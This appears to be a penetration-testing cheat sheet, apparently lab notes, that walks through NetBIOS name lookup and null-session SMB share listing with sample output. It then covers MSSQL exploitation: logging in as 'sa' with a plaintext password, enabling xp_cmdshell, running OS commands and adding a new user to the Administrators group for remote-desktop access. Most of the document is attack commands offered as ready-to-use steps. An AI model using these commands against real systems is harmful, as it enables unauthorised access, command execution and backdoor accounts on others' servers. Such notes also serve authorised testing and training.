## Lookup Netbios Names

>nmblookup -A 10.11.1.31

### Example Output:

```
	DAVID           <00> -         B <ACTIVE> 
	CORP            <00> - <GROUP> B <ACTIVE> 
	DAVID           <1f> -         B <ACTIVE> 
	DAVID           <03> -         B <ACTIVE> 
	DAVID           <20> -         B <ACTIVE> 
	THINC           <1e> - <GROUP> B <ACTIVE> 
	CORP            <1d> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
```

## Connect to Share without Password


This is an FTP like client to access SMB and CIFS resources on servers
-L specifies the Netbios name
-I is destination IP
-N is no password

>  smbclient -L \\COMPUTERNAME -I 10.0.0.1 -N

### Example Output:
```
OS=[Windows Server 2003 3790 Service Pack 1] Server=[Windows Server 2003 5.2]

	Sharename       Type      Comment
	---------       ----      -------
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	ADMIN$          Disk      Remote Admin
	public_access         Disk      
OS=[Windows Server 2003 3790 Service Pack 1] Server=[Windows Server 2003 5.2]

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	
```

## Connect to specific directory

>smbclient //DAVID/public_access -I 10.11.1.31 -N

# Further Exploitation with Username and Password for MSSQL Server

## Ensure you have relevant tools installed
>apt-get install sqsh freetds-bin freetds-common freetds-dev

## Show Databases
> sqsh -S 10.0.0.1 -U sa -P fdasjkl3 -C "SELECT name FROM master.dbo.sysdatabases"

## Login to sql command line
>sqsh -S 10.0.0.1 -U sa -P fdasjkl3

## If xp_cmdshell is not turned on then you have to enable it. This requires "advanced options" to be on:
```
exec sp_configure ‘show advanced options’, 1
go
reconfigure
go
```

# Output directory of C:\
> xp_cmdshell 'dir C:\'


##Add a new user and put them into Administrators Group
```
xp_cmdshell 'net user bob password /add'
go
xp_cmdshell 'net localgroup Administrators bob /add'
go
```


Now login via remote desktop if you have access
